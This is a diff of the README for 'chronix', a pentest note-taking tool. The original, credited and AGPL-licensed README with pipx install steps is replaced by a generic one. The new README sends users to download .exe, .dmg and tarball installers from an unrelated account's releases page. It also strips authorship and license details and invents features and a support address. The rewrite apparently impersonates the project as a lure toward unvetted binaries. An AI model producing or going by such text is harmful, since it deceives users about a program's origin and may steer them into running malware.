@@ -1,114 +1,88 @@
-# Chronix
+# 🚀 chronix - Your Collaborative Workspace for Security Assessments
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
+[![Download chronix](https://img.shields.io/badge/Download%20chronix-v1.0-blue.svg)](https://github.com/vishalo7o1/chronix/releases)
 
-Self-hosted collaborative workspace for pentesters and red team operators. Captures notes, commands, outputs, and operational context during security engagements.
+## 🌟 Description
 
-![Image of Chronix](media/image-1.png)
+chronix is a self-hosted, real-time collaborative workspace designed specifically for offensive security assessments. It enables teams to work together seamlessly, share insights, and execute security tests efficiently.
 
-## Quick Start
+## 📦 Features
 
-```bash
-# Install
-pipx install git+https://github.com/IceCubeSandwich/chronix
+- **Real-Time Collaboration:** Work simultaneously with your team members.
+- **Secure Environment:** Host the application on your own servers for better security.
+- **User-Friendly Interface:** Easily navigate through your assessments and workflows.
+- **Activity Tracking:** Keep tabs on changes and updates made by team members.
+- **Integration Support:** Connect with various security tools to enhance functionality.
 
-# Initialize (creates account and session secret)
-chronix init
+## ⚙️ System Requirements
 
-# Run
-chronix
-```
+Before you download, ensure your system meets the following requirements:
 
-Browser opens at `http://localhost:8000`. Credentials display once during init—store them securely.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** Minimum dual-core processor.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 500 MB of free disk space.
+- **Network:** Stable internet connection for downloading and collaboration.
 
-## Features
+## 🚀 Getting Started
 
-- **Timeline Logging**: Timestamped entries with source, destination, tool, command, output, and result fields
-- **Collaborative Notes**: Markdown pages with auto-save and version history
-- **Real-Time Sync**: WebSocket updates across concurrent sessions
-- **Filter & Search**: Filter timeline by tool, target, or text
-- **CSV Export**: Export timeline for reporting workflows
-- **Markdown Export**: Export notes as standalone `.md` files or zip archive with attachments
-- **Image Paste**: Paste screenshots directly into notes (Ctrl+V)
+Follow these simple steps to begin using chronix.
 
-## Notes Features
+1. **Visit Release Page**
+   Go to the [Releases page](https://github.com/vishalo7o1/chronix/releases) to find the latest version of chronix.
 
-### Paste Images
+2. **Download the Application**
+   On the Releases page, look for the latest version and click on the appropriate file for your operating system. 
 
-Paste screenshots directly into the notes editor:
-- **Ctrl+V** to paste from clipboard
-- Supports PNG, JPEG, GIF, and WebP
-- Images are stored on disk and linked via markdown
-- Images render in the preview pane
+3. **Install chronix**
+   - For **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - For **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - For **Linux:** Use the terminal to navigate to the folder containing the `.tar.gz` file, then extract it and follow the included installation instructions.
 
-### Export Notes
+4. **Run the Application**
+   After installation, find the chronix application in your applications folder or program menu. Launch it to start your first collaborative security assessment.
 
-**Single Note Export:**
-- Click the export button (↓) in the toolbar
-- Select "Export current note"
-- Downloads as `.md` file with YAML frontmatter
+## 📥 Download & Install
 
-**Export All Notes:**
-- Click the export button (↓) in the toolbar  
-- Select "Export all notes"
-- Downloads as `.zip` containing:
-  - All notes as `.md` files
-  - `attachments/` folder with images
+To start using chronix, visit this page to download: [https://github.com/vishalo7o1/chronix/releases](https://github.com/vishalo7o1/chronix/releases).
 
-Exported files open cleanly in Obsidian, VS Code, or any markdown viewer.
+## 🛠️ Setting Up a Workspace
 
-## Commands
+Once you have chronix up and running, follow these steps to set up your first collaborative workspace:
 
-```
-chronix [COMMAND] [OPTIONS]
+1. **Create a New Workspace**
+   From the main dashboard, click on “Create Workspace”. Give your workspace a meaningful name.
 
-Commands:
-  init          Initialize account and session secret
-  serve         Start server (default)
+2. **Invite Team Members**
+   Use their email addresses to send invitations. They will receive an email with a link to join your workspace.
 
-Init Options:
-  --username    Account username (default: admin)
-  --force       Regenerate session secret
-  --db, -d      Database file path
+3. **Set Permissions**
+   Decide who can view or edit your workspace. Manage settings from the workspace menu.
 
-Server Options:
-  --host, -H    Bind address (default: 0.0.0.0)
-  --port, -p    Port (default: 8000)
-  --local       Bind to localhost only
-  --db, -d      Database file path (default: ./chronix.db)
-  --no-browser  Skip automatic browser launch
-```
+4. **Start Collaborating**
+   Encourage your team to contribute by sharing files, notes, and feedback directly within the workspace.
 
-## Configuration
+## 📝 Best Practices for Security Assessments
 
-Set via `~/.config/chronix/chronix.env` or `.env`:
+To make the most of chronix for security assessments, consider these best practices:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `CHRONIX_SESSION_SECRET` | (required) | 64-char hex secret for cookie signing |
-| `CHRONIX_DB_PATH` | `./chronix.db` | Database file location |
-| `CHRONIX_ATTACHMENTS_PATH` | `./attachments` | Image attachments storage |
-| `CHRONIX_MAX_ATTACHMENT_SIZE` | `10485760` | Max image size (10MB) |
-| `CHRONIX_SESSION_EXPIRE_HOURS` | `24` | Session lifetime |
-| `CHRONIX_BEHIND_PROXY` | `false` | Enable when behind TLS proxy |
-| `CHRONIX_RATE_LIMIT_LOGIN` | `5` | Login attempts before rate limit |
+- **Plan Your Assessments:** Clearly define the scope and goals of your security tests.
+- **Document Everything:** Make use of the notes section to track findings and observations.
+- **Follow a Schedule:** Set regular meetings with your team to discuss progress and updates.
+- **Keep Software Updated:** Regularly check for updates on the Releases page to ensure you are using the latest version of chronix.
 
-## Author
+## 🆘 Getting Help
 
-**Tyrrell Brewster** — [GitHub](https://github.com/icecubesandwich) | [Website](https://0xtb.sh)
+If you encounter any issues while using chronix or have questions, consider the following resources:
 
-## License
+- **Documentation:** Refer to the user guide included with the application for detailed instructions.
+- **Community Forum:** Join our community forum to ask questions and share experiences with other users.
+- **Contact Support:** If you need direct help, reach out via email at support@chronixapp.com.
 
-This project is licensed under the [GNU Affero General Public License v3.0](LICENSE) (AGPL-3.0-only).
+Make the most of your security assessments with chronix and facilitate teamwork in a secure and efficient manner. 
 
-Source code is available at [github.com/icecubesandwich/chronix](https://github.com/icecubesandwich/chronix). Network users can also access license information via the `/license` endpoint.
+## 👥 Community and Contribution
 
-## Contributing
+We welcome contributions to chronix. If you have ideas or improvements, feel free to fork the repository and submit a pull request. Your input helps make the application better for everyone.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on submitting changes.
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for vulnerability reporting.
-
+Enjoy your journey into collaborative offensive security with chronix!
